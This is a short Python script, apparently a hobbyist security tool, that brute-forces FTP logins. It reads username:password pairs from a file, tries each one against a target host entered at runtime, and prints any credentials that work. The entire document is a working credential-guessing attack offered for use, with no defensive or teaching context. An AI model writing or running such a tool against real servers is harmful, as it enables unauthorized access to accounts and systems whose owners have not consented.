#!/usr/bin/python3

import ftplib

def bruteLogin(hostname, passwdDump):

    try:

        pd = open(passwdDump, 'r')

    except:

        print('[!!] File doesn\'t exist!')

    for line in pd.readlines():

        username = line.split(':')[0]
        password = line.split(':')[1].strip('\n')
        print('[+] Trying: ' + str(username) + ':' + str(password))

        try:

            ftp = ftplib.FTP(hostname)
            login = ftp.login(username, password)
            print('[+] Login success! ' + str(username) + ':' + str(password))
            ftp.quit()

        except:

            pass

host = input('[*]Enter a target: ')
passwdList = input('[*] Enter the Username:Password File Path: ')
bruteLogin(host, passwdList)